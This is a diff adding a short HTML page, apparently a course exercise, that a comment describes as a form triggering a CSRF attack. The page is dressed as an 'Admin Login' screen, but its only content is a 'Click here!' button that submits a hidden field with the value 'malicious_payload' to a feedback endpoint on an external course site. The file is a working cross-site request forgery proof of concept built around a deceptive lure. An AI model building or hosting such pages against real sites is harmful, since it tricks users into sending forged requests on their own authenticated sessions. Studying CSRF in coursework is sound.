@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Form</title>
+</head>
+<body>
+    <h1>Admin Login</h1>
+    <!-- Form that triggers a CSRF attack -->
+    <form action="https://cats.is-course.ru/feedback" method="POST">
+        <input type="hidden" name="important_data" value="malicious_payload">
+        <button type="submit">Click here!</button>
+    </form>
+</body>
+</html>
